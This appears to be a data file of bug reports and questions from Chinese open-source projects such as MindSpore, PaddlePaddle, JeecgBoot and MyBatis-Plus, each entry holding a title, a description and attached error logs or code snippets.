执行 增量升级SQL 报错,"Jeecg版本:2.0.2 是否修改包名: 无 报错提示 : Error Code: 1062. Duplicate entry 'ebb9d82ea16ad864071158e0c449d186' for key 'PRIMARY' 报错截图 : jeecgboot2.0.1到2.0.2增量升级SQL.sql 里的这一句 sql 的 id ( ebb9d82ea16ad864071158e0c449d186 ) 重复了 : INSERT INTO (, , , , , , , , , , , , , , , , , , , , , , , ) VALUES ('ebb9d82ea16ad864071158e0c449d186', 'd7d6e2e4e2934f2c9385a623fd98c6f3', '分类字典', '/isys/category', 'system/SysCategoryList', NULL, NULL, '1', NULL, '1', '5', '0', NULL, '1', '1', '0', NULL, 'admin', '2019-05-29 18:48:07', 'admin', '2019-05-29 18:48:27', '0', '0', '1');   <code>: sys_permission id parent_id name url component component_name redirect menu_type perms perms_type sort_no always_show icon is_route is_leaf hidden description create_by create_time update_by update_time del_flag rule_flag status"
Support deepcopy Instantiated cell,"RFC 需求来源：高校众智； 期望 支持deepcopy实例化的cell 使用场景： 无法进行deepcopy 对应错误为： 分析结果为：主要因为deepcopy只能copy python层面的内容，拿到的是一个没编译的图 期望能支持上面的deepcopy写法 Trail No. Task Description Related Issue(URL) 1 2   <code>: for epoch in range(args.start_epoch, opts[""numEpoch""]): if epoch != args.start_epoch: prev_net = copy.deepcopy(net) # save the not updated net for generating data dataset.reset(prev_net, domain_specific_nets, train_videos, opts, args) # using prev_net here File ""/home/archiconda3/env/xxx/lib/python3.7/site-packages/mindspore/common/api.py"", line 603, in run raise KeyError('{} graph is not exist'.format(phase_real)) KeyError: '12test.1609099843434477056 graph is not exist'"
[CT][MS][Upsample ]uint16类型下精度问题,"'mode': 'bicubic', 'align_corners': True，dtype为uint16类型存在精度差距过大问题 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph run testcase testcase pass   <code>: def test_upsample_input_dtype_uint16_4d(): x = Tensor(np.random.randn(1, 2, 3, 4).astype(np.uint16)) input_list = [x] fact = UpsampleMock(attributes={'size': (2, 7), 'mode': 'bicubic', 'align_corners': True}, inputs=input_list) &gt; fact.forward_cmp() test_upsample_input_dtype_uint16_4d ____________________________________________________________________________________ def test_upsample_input_dtype_uint16_4d(): x = Tensor(np.random.randn(1, 2, 3, 4).astype(np.uint16)) input_list = [x] fact = UpsampleMock(attributes={'size': (2, 7), 'mode': 'bicubic', 'align_corners': True}, inputs=input_list) &gt; fact.forward_cmp() test_upsample.py:113: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/upsample_ops.py:49: in forward_cmp allclose_nparray(data_expected, data_me, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[65535, 6142, 65535, 32767, 0, 59393, 0], [65535, 26623, 0, 26623, 65535, 6142, 65535]... 65535, 38911, 0, 59393, 0], [ 0, 0, 1, 59393, 0, 32767, 65535]]]], dtype=uint16) data_me = array([[[[ 6.5535000e+04, 7.1678906e+04, 6.5535000e+04, 3.2767500e+04, 0.0000000e+00, -6.1439062e+03, ... 1.0000000e+00, -6.1433125e+03, 0.0000000e+00, 3.2767406e+04, 6.5535000e+04]]]], dtype=float32) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 6142 59393 6142 59393 0 59393] E data_me_error:[ 7.1678906e+04 -6.1439062e+03 7.1678906e+04 -6.1439062e+03 E 5.9375000e-01 -6.1433125e+03] E loss:[6.553691e+04 6.553691e+04 6.553691e+04 6.553691e+04 5.937500e-01 E 6.553631e+04] ../share/utils.py:24: AssertionError"
nv_test could not add_dependencies of header-ONLY library,"eigen3 is a header only library and we take eigen3 as a cmake external library. And in my device_context implementation #2709:Represent operators' inputs, outputs, and attributes by Variable , the device_context depends on eigen3. So, we must have eigen3 download before device_context_test compiled. However, if i write There will be such error: I just hack the nv_test in generic.cmake as follows: And change my compiling command to And it works. So, how can we handle this circumstance, and is the hacking way appropriate?   <code>: nv_test(device_context_test SRCS device_context_test.cc DEPS place eigen3 glog gflags) CMake Error at cmake/generic.cmake:246 (target_link_libraries): Target ""eigen3"" of type UTILITY may not be linked into another target. One may link only to STATIC or SHARED libraries, or to executables with the ENABLE_EXPORTS property set. function(nv_test TARGET_NAME) if (WITH_GPU AND WITH_TESTING) set(options """") set(oneValueArgs """") set(multiValueArgs SRCS INCS DEPS) cmake_parse_arguments(nv_test ""${options}"" ""${oneValueArgs}"" ""${multiValueArgs}"" ${ARGN}) cuda_add_executable(${TARGET_NAME} ${nv_test_SRCS}) target_link_libraries(${TARGET_NAME} ${nv_test_DEPS} gtest gtest_main) add_dependencies(${TARGET_NAME} ${nv_test_INCS} ${nv_test_DEPS} gtest gtest_main) add_test(${TARGET_NAME} ${TARGET_NAME}) endif() endfunction(nv_test) nv_test(device_context_test SRCS device_context_test.cc INCS eigen3 DEPS place glog gflags)"
[ST][MS][NET][wide&deep][GPU 8p]The parameter column_order will be deprecated in the future. Please use '.project' operaion instead,"wide&amp;deep网络dataset接口使用了将要废弃的参数 / 硬件环境: /device ascend/GPU : -- MindSpore version :r1.9 commit_id:4030fed4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220908 MindSpore 版本：编译时间20220914181553 r1.9.0 commit_id:4030fed4 (/): /mode graph test_ms_wide_deep_criteo_train_infer_gpu_8p_0001.py cd solution_test/cases/02network/06recommend/wide_deep/train pytest -s test_ms_wide_deep_criteo_train_infer_gpu_8p_0001.py 网络训练正常，脚本无使用废弃接口或接口无使用废弃参数 走给郭志建   <code>: [WARNING] ME(86253:140527954417472,MainProcess):2022-09-15-01:56:58.676.650 [mindspore/dataset/engine/datasets.py:913] The parameter column_order will be deprecated in the future. Please use '.project' operation instead."
采用clang10.0.1编译mksh失败,"升级clang10.0.1的编译器版本后，编qemu的项目，发现mksh编译失败。 报错信息 相关信息，llvm的mailing-list，有人反馈过类似的错误： https://www.mail-archive.com/llvm-bugs@lists.llvm.org/msg33926.html llvm修改该bug的patch： https://reviews.llvm.org/D79919   <code>: ld.lld: error: -plugin-opt=Oz: number expected, but got 'z'"
paddle int8 单机多卡训练问题,paddle 版本1.5.2 gpu K40 训练几十个batch之后报错，per gpu bs=32 配置： export FLAGS_fast_eager_deletion_mode=1 export FLAGS_eager_delete_tensor_gb=0.0 报错信息如下   <code>: F1008 16:22:31.066076 20318 all_reduce_op_handle.cc:73] cudaStreamSynchronize an illegal memory access was encountered *** Check failure stack trace: *** F1008 16:22:31.066076 20329 device_context.cc:333] cudaStreamSynchronize an illegal memory access was encountered errno:77 *** Check failure stack trace: *** @ 0x7f524077c7dd google::LogMessage::Fail() @ 0x7f524077c7dd google::LogMessage::Fail() @ 0x7f524078028c google::LogMessage::SendToLog() @ 0x7f524078028c google::LogMessage::SendToLog() @ 0x7f524077c303 google::LogMessage::Flush() @ 0x7f524077c303 google::LogMessage::Flush() @ 0x7f524078179e google::LogMessageFatal::~LogMessageFatal() @ 0x7f524078179e google::LogMessageFatal::~LogMessageFatal() @ 0x7f5242777fcd _ZNSt17_Function_handlerIFvvEZNK6paddle8platform17CUDADeviceContext4WaitEvEUlvE_E9_M_invokeERKSt9_Any_data @ 0x7f524249b7ed paddle::framework::details::AllReduceOpHandle::RunAllReduceFuncs() @ 0x7f5242785a54 paddle::platform::TemporaryAllocator::Release() @ 0x7f524249d158 paddle::framework::details::AllReduceOpHandle::RunImpl() @ 0x7f524277afa1 paddle::platform::CUDADeviceContext::Wait() @ 0x7f52424ac2e0 paddle::framework::details::OpHandleBase::Run() @ 0x7f52424aba57 paddle::framework::details::OpHandleBase::RecordWaitEventOnCtx() @ 0x7f524248d656 paddle::framework::details::FastThreadedSSAGraphExecutor::RunOpSync() @ 0x7f524248ece5 paddle::framework::details::FetchOpHandle::WaitInputVarGenerated() @ 0x7f524248c2bf paddle::framework::details::FastThreadedSSAGraphExecutor::RunOp() @ 0x7f524248f354 paddle::framework::details::FetchOpHandle::RunImpl() @ 0x7f524248c67f _ZNSt17_Function_handlerIFvvESt17reference_wrapperISt12_Bind_simpleIFS1_ISt5_BindIFZN6paddle9framework7details28FastThreadedSSAGraphExecutor10RunOpAsyncEPSt13unordered_mapIPNS6_12OpHandleBaseESt6atomicIiESt4hashISA_ESt8equal_toISA_ESaISt4pairIKSA_SC_EEESA_RKSt10shared_ptrINS5_13BlockingQueueImEEEEUlvE_vEEEvEEEE9_M_invokeERKSt9_Any_data @ 0x7f52424ac2e0 paddle::framework::details::OpHandleBase::Run() @ 0x7f524086bad3 std::_Function_handler&lt;&gt;::_M_invoke() @ 0x7f524248d656 paddle::framework::details::FastThreadedSSAGraphExecutor::RunOpSync() @ 0x7f52406ffb37 std::__future_base::_State_base::_M_do_set() @ 0x7f524248c2bf paddle::framework::details::FastThreadedSSAGraphExecutor::RunOp() @ 0x7f52a8cd3973 __GI___pthread_once
使用源码编译Android的PaddlePaddle库报错,使用源码编译Android的PaddlePaddle库报错，报错如下：   <code>: [ 94%] Linking CXX shared library libpaddle_capi_shared.so /mnt/android/linux/arm_standalone_toolchain/lib/gcc/arm-linux-androideabi/4.9.x/../../../../arm-linux-androideabi/bin/ld: missing group end /mnt/android/linux/arm_standalone_toolchain/lib/gcc/arm-linux-androideabi/4.9.x/../../../../arm-linux-androideabi/bin/ld: use the --help option for usage information clang38++: error: linker command failed with exit code 1 (use -v to see invocation) paddle/capi/CMakeFiles/paddle_capi_shared.dir/build.make:240: recipe for target 'paddle/capi/libpaddle_capi_shared.so' failed make[2]: *** [paddle/capi/libpaddle_capi_shared.so] Error 1 CMakeFiles/Makefile2:1389: recipe for target 'paddle/capi/CMakeFiles/paddle_capi_shared.dir/all' failed make[1]: *** [paddle/capi/CMakeFiles/paddle_capi_shared.dir/all] Error 2 Makefile:151: recipe for target 'all' failed make: *** [all] Error 2
MBG不能生成带generator的注解,"因为需要id为UUID字串，但是@GeneratedValue(generator = ""UUID"")不支持回写，所以我通过以下注解来实现生成UUID主键： 但我在generatorConfiguration中尝试了很多组合都不能让MBG生成这样的注解： 以上配置生成的是不包含generator的注解。请问大大，有什么好办法能解决以上问题吗？以及功能将文档看了很多遍，依然还不找不到门路。 数据库：MySQL   <code>: @Id @GeneratedValue(strategy = GenerationType.IDENTITY, generator = ""select REPLACE(UUID(),'-','')"") private String id; &lt;table tableName=""%""&gt; &lt;generatedKey column=""id"" sqlStatement=""select REPLACE(UUID(),'-','')"" identity=""true"" type=""post""/&gt; &lt;/table&gt;"
构建前端所需要树结构方法数据多了很耗时吗？,"以下这个方法参数 List depts数据多了非常耗时吗？sql查询获取所有部门数据大约19000多条记录，600多毫秒，前端请求返回数据耗时月12秒左右，是不是这个方法构建树耗时？   <code>: /** * 构建前端所需要树结构 * * @param depts 部门列表 * @return 树结构列表 */ @Override public List&lt;SysDept&gt; buildDeptTree(List&lt;SysDept&gt; depts) { List&lt;SysDept&gt; returnList = new ArrayList&lt;SysDept&gt;(); List&lt;Long&gt; tempList = depts.stream().map(SysDept::getDeptId).collect(Collectors.toList()); for (SysDept dept : depts) { // 如果是顶级节点, 遍历该父节点的所有子节点 if (!tempList.contains(dept.getParentId())) { recursionFn(depts, dept); returnList.add(dept); } } if (returnList.isEmpty()) { returnList = depts; } return returnList; }"
pip 安装CPU版本 使用提示No module named 'proto',"建立issue时，为快速解决问题，请您根据使用情况给出如下信息： 标题：请包含关键词“安装错误”/“编译错误”，例如“Mac编译错误” 1）PaddlePaddle版本：1.4.1 2）CPU：i7-8u 3）GPU：150max 4）系统环境：ubuntu 18.04 python3.6 安装方式信息： 1）pip 在线安装 使用的清华源， 没办法，在寝室移动的网太慢了。刚刚装的机器没有装proxy(有没有简单的Ubuntu代理方式（基于ss的），求帮助) 我在issu里查了一下，有说需要make gen_proto_py add: but i find that 求科普，今天刚刚接触这个东西。由于电脑cuda是用的10.0所以没有装gpu版本   <code>: File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/executor.py"", line 847, in train_from_dataset print_period=print_period) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/executor.py"", line 676, in _prepare_trainer trainer = TrainerFactory()._create_trainer(program._fleet_opt) File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/trainer_factory.py"", line 30, in _create_trainer trainer = MultiTrainer() File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/trainer_desc.py"", line 71, in __init__ super(MultiTrainer, self).__init__() File ""/usr/local/lib/python3.6/dist-packages/paddle/fluid/trainer_desc.py"", line 26, in __init__ from proto import trainer_desc_pb2 ModuleNotFoundError: No module named 'proto'"
网络求交叉导数报shape error,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 如下构建求导网络： 1，获取LeNet关于某输入input/label的loss； 2，loss关于weights求导，得到gradients； 3，给定target_gradients，定义loss2 = mse(target_gradients, gradients) 4, 求loss2关于input和label的导数。 正常输出loss2关于input/label的导数。 ValueError: For 'AddN' the should be == shape of inputs[0]: [107], but got [1, 107].   <code>: shape of inputs[1]"
上传组件文档默认值与实际不符,版本号   <code>: 做项目时发现上传组件文件数量限制默认为10，官方示例中一样为10，但文档中默认为 - 2.9.4 和 2.10.5 均实验为10
[ST][MS][NET][pangu-alpha][910 8p]RuntimeError: Sync stream error,"pangu-alpha网络在910环境8p训练失败 / 硬件环境: /device ascend : -- MindSpore version :r1.9 commit_id:4be97129 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20220810 MindSpore 版本：编译时间20220831181548 r1.9.0 commit_id:4be97129 (/): /mode graph test_ms_pangu_alpha_gpu_train_8p_0001.py cd solution_test/cases/02network/02nlp/pangu_alpha/train pytest -s test_ms_pangu_alpha_gpu_train_8p_0001.py 网络训练成功 走给黄信静   <code>: Traceback (most recent call last): File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/pangu_alpha/train/test_ms_pangu_alpha_train_910_8p_0002/scripts/../train.py"", line 525, in &lt;module&gt; run_train(opt) File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/02nlp/pangu_alpha/train/test_ms_pangu_alpha_train_910_8p_0002/scripts/../train.py"", line 234, in run_train model.train(120, ds, callbacks=callback, sink_size=args_opt.sink_size, dataset_sink_mode=True) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1050, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 624, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 702, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 591, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 982, in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1190, in __call__ return self.run(obj, *args, phase=phase) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1227, in run return self._exec_pip(obj, *args, phase=phase_real) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 97, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1209, in _exec_pip return self._graph_executor(args, phase) RuntimeError: Sync stream error! ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_device_address.cc:203 SyncStream"
Mybatis全局配置采用xml方式配置的情况下，setting - defaultEnumTypeHandler属性配置无效,"版本： 问题描述： 在配置时，注入属性：; mybatis-config.xml文件中填写配置； 但是发现对枚举类型的处理仍然是默认的类而非配置的类。 问题初步定位： 类中的方法并未对属性进行处理。   <code>: 3.0-RC2 sqlSessionFactory &lt;property name=""configLocation"" value=""classpath:mybatis-config.xml"" /&gt; &lt;setting name=""defaultEnumTypeHandler"" value=""org.apache.ibatis.type.EnumOrdinalTypeHandler""/&gt; org.apache.ibatis.type.EnumTypeHandler com.baomidou.mybatisplus.core.MybatisXMLConfigBuilder settingsElement defaultEnumTypeHandler"
cmake link error in stringpiece,"when it compile the stringpiece, compiler goes in wrong way of using the gcc instead of g++.   <code>: Undefined symbols for architecture x86_64: ""std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp; std::__1::operator&lt;&lt;&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt;(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;, std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;)"", referenced from: paddle::operator&lt;&lt;(std::__1::basic_ostream&lt;char, std::__1::char_traits&lt;char&gt; &gt;&amp;, paddle::StringPiece) in libstringpiece.a(stringpiece.cc.o) ld: symbol(s) not found for architecture x86_64 clang: error: linker command failed with exit code 1 (use -v to see invocation) make[2]: *** [paddle/strings/stringpiece_test] Error 1 make[1]: *** [paddle/strings/CMakeFiles/stringpiece_test.dir/all] Error 2 make: *** [all] Error 2"
登录报错pigx-admin Authorities must be either a String or a Collection,pigx版本: 3.1.0 master 操作系统:mac os 是否修改包名: 否 PigxUserAuthenticationConverter.getAuthorities(..);中获取authorities返回空 打断点查看data中没有authorities的key值   <code>: java.lang.RuntimeException: java.lang.IllegalArgumentException: Authorities must be either a String or a Collection at io.undertow.servlet.spec.RequestDispatcherImpl.error(RequestDispatcherImpl.java:507) at io.undertow.servlet.spec.RequestDispatcherImpl.error(RequestDispatcherImpl.java:427) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:331) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:364) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) Caused by: java.lang.IllegalArgumentException: Authorities must be either a String or a Collection at com.pig4cloud.pigx.common.security.component.PigxUserAuthenticationConverter.getAuthorities(PigxUserAuthenticationConverter.java:89) at com.pig4cloud.pigx.common.security.component.PigxUserAuthenticationConverter.extractAuthentication(PigxUserAuthenticationConverter.java:67) at org.springframework.security.oauth2.provider.token.DefaultAccessTokenConverter.extractAuthentication(DefaultAccessTokenConverter.java:144) at org.springframework.security.oauth2.provider.token.RemoteTokenServices.loadAuthentication(RemoteTokenServices.java:121) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationManager.authenticate(OAuth2AuthenticationManager.java:83) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:150) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:357) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:270) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:274) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchToPath(ServletInitialHandler.java:209) at io.undertow.servlet.spec.RequestDispatcherImpl.error(RequestDispatcherImpl.java:501) ... 15 common frames omitted
SearchModel,"问题是进入编辑页面后，改变GroupId的下拉框，会导致SearchModel里的GroupId也会发生改变，可实际没有赋值。 无 组件版本 latest 浏览器 all Server Side Web Assembly   <code>: &lt;Table TItem=""School"" IsStriped=""true"" IsBordered=""true"" IsFixedHeader=""true"" ShowToolbar=""true"" ShowSearch=""true"" IsMultipleSelect=""true"" ShowExtendButtons=""true"" AddModalTitle=""增加"" EditModalTitle=""编辑"" ShowEmpty=""true"" SearchMode=""SearchMode.Top"" SearchModel=""@SearchModel"" CollapsedTopSearch=""true"" IsPagination=""true"" PageItemsSource=""@PageItemsSource"" OnQueryAsync=""@OnQueryAsync"" OnResetSearchAsync=""@OnResetSearchAsync"" OnEditAsync=""@OnEditAsync"" OnAddAsync=""@OnAddAsync"" OnSaveAsync=""@OnSaveAsync"" OnDeleteAsync=""@OnDeleteAsync""&gt; &lt;TableColumns&gt; &lt;TableColumn @bind-Field=""@context.GroupId"" Lookup=""AllGroups""/&gt; &lt;TableColumn @bind-Field=""@context.Name""/&gt; &lt;/TableColumns&gt; &lt;SearchTemplate&gt; &lt;GroupBox Title=""搜索条件""&gt; &lt;Row ItemsPerRow=""ItemsPerRow.Four"" RowType=""RowType.Inline""&gt; &lt;BootstrapInput @bind-Value=""@context.Name"" placeholder=""请输入学校名"" ShowLabel=""true""/&gt; &lt;Select @bind-Value=""@context.GroupId"" placeholder=""请选择学校组"" Items=""@AllGroups"" ShowLabel=""true""/&gt; &lt;/Row&gt; &lt;/GroupBox&gt; &lt;/SearchTemplate&gt; &lt;EditTemplate&gt; &lt;Row ItemsPerRow=""ItemsPerRow.Four"" RowType=""RowType.Inline""&gt; &lt;BootstrapInput @bind-Value=""@context.Name""/&gt; &lt;Select @bind-Value=""@context.GroupId"" PlaceHolder=""组名"" Items=""@AllGroups""/&gt; &lt;/Row&gt; &lt;/EditTemplate&gt; &lt;/Table&gt; private School SearchModel { get; set; } = new School();"
流程管理获取当前环节错误,流程管理获取待签或者待办列表的时候，当前步骤获取错误，获取到的结果其实是上一步，错误原因如下: 获取流程的当前步骤的代码逻辑其实是获取流程的任务按照任务的完成时间进行降序排列取第一个，代码如下 但是其实忽略了一个事情，当前处理环节肯定是尚未结束的，因此结束时间是null，当进行任务降序排列的时候这个任务就会排序到最后一个了，所以应该修改为使用开始时间，代码如下   <code>: List&lt;HistoricTaskInstance&gt; historyTasks = historyService.createHistoricTaskInstanceQuery().processInstanceId(historicProcessInstance.getId()).orderByHistoricTaskInstanceEndTime().desc().list(); List&lt;HistoricTaskInstance&gt; historyTasks = historyService.createHistoricTaskInstanceQuery().processInstanceId(historicProcessInstance.getId()).orderByHistoricTaskInstanceStartTime().desc().list();
fluid版本迁移到static版本，dynamic_gru要如何修改？,"PaddlePaddle 2.1.1 Fluid的代码如下，fluid版本迁移到static版本，dynamic_gru要如何修改？   <code>: forward_gru = fluid.layers.dynamic_gru(input=input_proj_bn_forward, size=size, gate_activation='sigmoid', candidate_activation=act, param_attr=paddle.ParamAttr(name=name + '_forward_gru_weight'), bias_attr=paddle.ParamAttr(name=name + '_forward_gru_bias'), is_reverse=False) reverse_gru = fluid.layers.dynamic_gru(input=input_proj_bn_reverse, size=size, gate_activation='sigmoid', candidate_activation=act, param_attr=paddle.ParamAttr(name=name + '_reverse_gru_weight'), bias_attr=paddle.ParamAttr(name=name + '_reverse_gru_bias'), is_reverse=True) output = paddle.concat(x=[forward_gru, reverse_gru], axis=1)"
u-button样式问题,"当我直接在 u-button 上面写style,在开发环境下不会有问题;真机模式和打包后会出现问题:   <code>: SyntaxError: Unexpected end of JSON input [Vue warn]: Error in created hook: ""SyntaxError: Unexpected end of JSON input"""
[CT][MS][MulNoNan] GPU环境，当输入类型为complex64或complex128时，正向即报错类型不支持,"1， 查看算子参数说明，发现此算子输入支持 complex64 和 complex128 /mode graph   <code>: def test_mulnonan_inputx_3d_complex64_inputy_3d_complex64(): input_list = [] input_list.append(Tensor(np.random.randn(3, 2, 3) + 1j * np.random.randn(3, 2, 3), dtype=mstype.complex64)) input_list.append(Tensor(np.random.randn(3, 2, 3) + 1j * np.random.randn(3, 2, 3), dtype=mstype.complex64)) fact = MulNoNanMock(inputs=input_list) fact.loss = 2e-6 &gt; fact.forward_cmp() test_mulnonan.py:627: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/mulnonan_ops.py:98: in forward_cmp out_me = self.forward_mindspore_impl() ../share/ops/primitive/mulnonan_ops.py:51: in forward_mindspore_impl out = net(self.input_x, self.input_y) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:573: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:956: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:929: in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7fd565800410&gt;, obj = WrapOp&lt;&gt;, phase = 'train.1656401161703954432.140545256466960.51' do_convert = True, auto_parallel_mode = False args = (Tensor(shape=[3, 2, 3], dtype=Complex64, value= [[[-0.609348+1.81403j, 1.92564-0.331891j, -0.747073+0.108199j], [1....0823-0.122121j, 0.977384+1.35896j, 1.69408-1.50855j], [0.544868-1.34392j, -0.600822+0.552934j, 0.156965-2.01061j]]])) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. 